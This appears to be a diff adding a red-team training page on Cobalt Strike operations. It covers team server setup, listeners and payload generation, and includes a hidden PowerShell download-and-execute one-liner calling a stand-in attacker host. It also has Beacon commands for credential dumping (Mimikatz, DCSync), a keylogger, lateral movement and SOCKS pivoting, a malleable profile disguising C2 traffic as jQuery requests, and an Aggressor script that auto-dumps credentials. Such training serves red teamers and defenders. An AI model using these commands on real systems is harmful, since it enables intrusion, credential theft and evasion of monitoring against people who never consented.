@@ -1,0 +1,247 @@
+---
+import TrainingPage from '../../layouts/TrainingPage.astro';
+---
+<TrainingPage
+  title="Cobalt Strike — Red Team Academy"
+  module="C2 Frameworks"
+  tags={['cobalt-strike', 'beacon', 'c2', 'red-team']}
+  pageKey="c2-cobalt-strike"
+>
+  <h1>Cobalt Strike</h1>
+
+  <h2>Overview</h2>
+  <p>Cobalt Strike is the industry-standard commercial red team platform. Its agent (<strong>Beacon</strong>) is designed for long-haul operations: low-and-slow check-ins, malleable network profiles that blend with legitimate traffic, peer-to-peer chaining, and a scriptable automation layer (Aggressor Script). Understanding Cobalt Strike is essential for red teamers and defenders alike — it's the tool most commonly referenced in threat intelligence reports and incident response findings.</p>
+  <p>Cobalt Strike requires a licensed team server. This page covers architecture, workflow, and Beacon commands based on public documentation and training materials.</p>
+
+  <div class="diagram-container">
+    <img src="/images/c2-frameworks/cobalt-strike-arch.svg" alt="Cobalt Strike architecture: operator connects to team server, which manages HTTP, DNS, and SMB pipe beacons on target hosts via redirectors">
+    <div class="diagram-label">// cobalt strike architecture — team server, listeners, and beacon variants</div>
+  </div>
+
+  <h2>Architecture — Team Server and Client</h2>
+  <p>Cobalt Strike uses a client/server model. The team server runs on a Linux VPS and manages all Beacon connections. Multiple operators connect via the Cobalt Strike GUI client.</p>
+  <pre><code># Start team server (Linux VPS):
+./teamserver ATTACKER_IP PASSWORD [malleable_c2_profile.profile]
+
+# Example:
+./teamserver 203.0.113.5 SuperSecretPass /opt/profiles/jquery.profile
+
+# Connect with CS client:
+# Host: 203.0.113.5  Port: 50050  User: operator  Password: SuperSecretPass
+
+# Recommended infrastructure setup:
+# - Redirectors (Apache mod_rewrite, nginx, CDN) in front of team server
+# - Separate team server from redirectors
+# - Use a domain with categorized history for C2 traffic blending
+# - Redirectors forward only valid Beacon traffic; block everything else</code></pre>
+
+  <h2>Listeners</h2>
+  <p>Listeners define how Beacons call home. Create listeners before generating payloads.</p>
+  <pre><code>># Listener types in Cobalt Strike:
+
+# HTTP/S Listeners:
+# Cobalt Strike → Listeners → Add
+# Name: http-redirector
+# Payload: Beacon HTTP
+# HTTP Hosts: your.redirector.com
+# HTTP Port (C2): 80
+# HTTP Port (Bind): 80
+
+# DNS Listener (useful when HTTP/S blocked):
+# Payload: Beacon DNS
+# DNS Hosts: ns1.yourdomain.com
+# DNS Host (Stager): stager.yourdomain.com
+# Beacon DNS TTL: 1
+
+# SMB Listener (peer-to-peer, no direct internet needed):
+# Payload: Beacon SMB
+# SMB Named Pipe: \\.\pipe\msagent_01   # customize to blend in
+
+# TCP Listener (direct bind):
+# Payload: Beacon TCP
+# Port: 4444
+
+# Listener best practice: name listeners descriptively
+# (e.g., "http-aws-redirector", "smb-internal") for multi-operator clarity</code></pre>
+
+  <h2>Payload Generation and Staging</h2>
+  <p>Cobalt Strike generates staged and stageless payloads in multiple formats. Stageless payloads are larger but don't require a second-stage pull — better for restrictive egress environments.</p>
+  <pre><code># Payload generation: Cobalt Strike → Attacks → Packages
+
+# Windows Executable (stageless — recommended):
+# Attacks → Packages → Windows Executable (S)
+# Listener: http-redirector
+# Output: EXE (or DLL, raw shellcode)
+# x64 architecture for modern targets
+
+# PowerShell payload (staged — pulls second stage via HTTP):
+# Attacks → Packages → HTML Application (HTA) or PowerShell
+
+# Shellcode for injection:
+# Attacks → Packages → Windows Executable (S)
+# Output: Raw shellcode → inject into process with your loader
+
+# Scripted web delivery (serves payload via HTTP):
+# Attacks → Web Drive-by → Scripted Web Delivery
+# URI: /update
+# Payload: PowerShell one-liner pulls and executes Beacon
+# PowerShell one-liner output:
+# powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://ATTACKER/update'))"
+
+# Stage via SMB (for air-gapped or internally-only machines):
+# Generate SMB Beacon payload, deploy it on a host that has
+# a Beacon already calling out — chain internally via named pipe</code></pre>
+
+  <h2>Beacon Commands</h2>
+  <p>Once a Beacon checks in, interact with it from the Beacon console. Beacon runs commands asynchronously — they execute on the next check-in unless running in interactive mode.</p>
+  <pre><code># Situational awareness:
+sleep 0            # set interactive mode (immediate response, noisy)
+sleep 60 30        # 60s sleep, 30% jitter (stealthy, asynchronous)
+
+whoami             # current user
+getuid             # same — user context
+shell whoami /all  # full token info via cmd.exe
+
+hostname           # target hostname
+sysinfo            # OS, build, arch
+
+# Process list and migration:
+ps                 # list processes with PID, user, integrity, path
+inject 1234 x64    # inject Beacon into PID 1234
+migrate 1234       # migrate (Meterpreter-style alias in some contexts)
+
+# Credential operations:
+logonpasswords     # Mimikatz sekurlsa::logonpasswords
+hashdump           # SAM hashes
+dcsync DOMAIN\Administrator    # DCSync (Mimikatz lsadump::dcsync)
+make_token DOMAIN\Administrator Password1!    # impersonate via login
+
+# File operations:
+ls                             # list current directory
+download C:\path\to\file.txt   # pull file to team server
+upload /local/tool.exe         # push file to Beacon working dir
+shell copy file.exe C:\Windows\Temp\
+
+# Lateral movement (via jump):
+jump psexec    TARGET LISTENER    # PsExec — creates service
+jump psexec64  TARGET LISTENER    # PsExec64
+jump winrm     TARGET LISTENER    # WinRM (PowerShell remoting)
+jump winrm64   TARGET LISTENER
+
+# Remote execution without spawning new Beacon:
+remote-exec wmi    TARGET "cmd.exe /c whoami"
+remote-exec winrm  TARGET "Get-Process"
+remote-exec psexec TARGET "cmd.exe /c net user"
+
+# Keylogger:
+keylogger          # start in current process
+keystrokes         # view captured keystrokes
+
+# Screenshots and interaction:
+screenshot         # take screenshot
+desktop            # interactive VNC-like view (requires Java client)
+
+# Port forward:
+rportfwd 8080 10.10.10.5 80    # forward 8080 on team server → 10.10.10.5:80</code></pre>
+
+  <h2>SOCKS Proxy and Pivoting</h2>
+  <p>Beacon can act as a SOCKS proxy, routing attacker traffic through the compromised host into internal subnets.</p>
+  <pre><code># Start SOCKS5 proxy through Beacon (in Beacon console):
+socks 1080         # SOCKS4 on port 1080
+socks 1080 socks5  # SOCKS5
+
+# Or via GUI: right-click Beacon → Pivoting → SOCKS Server
+
+# Configure proxychains (/etc/proxychains4.conf):
+# socks5 127.0.0.1 1080
+
+# Route tools through Beacon:
+proxychains nmap -sV -p 445 10.10.10.0/24
+proxychains impacket-psexec DOMAIN/Administrator:PASSWORD@10.10.10.10
+proxychains evil-winrm -i 10.10.10.10 -u Administrator -H NTLMHASH
+
+# Stop SOCKS proxy:
+socks stop</code></pre>
+
+  <h2>SMB Beacon — Peer-to-Peer Chaining</h2>
+  <p>SMB Beacons communicate over named pipes with a parent Beacon rather than directly to the team server. Ideal for hosts without internet access, reducing the number of direct C2 connections.</p>
+  <pre><code># Deploy SMB Beacon onto a host reachable by an existing HTTP Beacon:
+# 1. Generate SMB Beacon payload (listener: smb-internal)
+# 2. Transfer payload to target host via existing HTTP Beacon:
+upload /tmp/smb_beacon.exe
+shell move smb_beacon.exe C:\Windows\Temp\update.exe
+
+# 3. Execute it — child Beacon connects to parent via named pipe:
+shell C:\Windows\Temp\update.exe
+
+# 4. Link parent to child (in parent Beacon console):
+link TARGET \\.\pipe\msagent_01
+
+# Chain visualization:
+# Internet → Team Server ←→ HTTP Beacon (internet-facing host)
+#                                   ↕ named pipe
+#                            SMB Beacon (internal host, no internet)</code></pre>
+
+  <h2>Malleable C2 Profiles</h2>
+  <p>Malleable C2 profiles control every aspect of Beacon's network traffic — URI paths, HTTP headers, User-Agent strings, response patterns. A good profile makes Beacon traffic indistinguishable from legitimate application traffic.</p>
+  <pre><code>># Example malleable profile snippet (jquery.profile):
+set sleeptime "60000";     # 60 second default sleep
+set jitter "20";           # 20% jitter
+
+http-get &#123;
+    set uri "/jquery-3.3.1.min.js";
+    client &#123;
+        header "Accept" "text/html,application/xhtml+xml";
+        header "Host" "code.jquery.com";
+        metadata &#123;
+            base64url;
+            prepend "?__cfduid=";
+            header "Cookie";
+        &#125;
+    &#125;
+    server &#123;
+        header "Content-Type" "application/javascript; charset=utf-8";
+        header "Cache-Control" "max-age=2592000";
+        output &#123;
+            prepend "/*! jQuery v3.3.1 | (c) JS Foundation and other contributors */";
+            print;
+        &#125;
+    &#125;
+&#125;
+
+# Load profile at team server start:
+./teamserver ATTACKER_IP PASSWORD /opt/profiles/jquery.profile
+
+# Validate profile before use:
+./c2lint /opt/profiles/jquery.profile</code></pre>
+
+  <h2>Aggressor Script Basics</h2>
+  <p>Aggressor Script is Cobalt Strike's built-in scripting language for automation, custom commands, and workflow hooks. Scripts run in the CS client and interact with the team server via its API.</p>
+  <pre><code>># Load a script: Cobalt Strike → Script Manager → Load
+
+# Simple Aggressor script — auto-run recon on new Beacon:
+on beacon_initial &#123;
+    local('$bid');
+    $bid = $1;
+    blog($bid, "New Beacon! Running initial recon...");
+    bsleep($bid, 0, 0);
+    bshell($bid, "whoami /all && ipconfig /all && net user");
+    bps($bid);
+&#125;
+
+# Auto-inject Mimikatz on SYSTEM Beacons:
+on beacon_initial &#123;
+    if (binfo($1, "user") eq "*SYSTEM") &#123;
+        blog($1, "SYSTEM beacon — dumping creds");
+        bmimikatz($1, "sekurlsa::logonpasswords");
+    &#125;
+&#125;
+
+# Common Aggressor functions:
+# bshell($bid, "command")         — run via cmd.exe
+# bpowershell($bid, "ps-command") — run PowerShell
+# bmimikatz($bid, "module::cmd")  — Mimikatz passthrough
+# blog($bid, "message")           — log to Beacon console
+# binject($bid, $pid, $arch)      — inject shellcode into PID</code></pre>
+
+</TrainingPage>
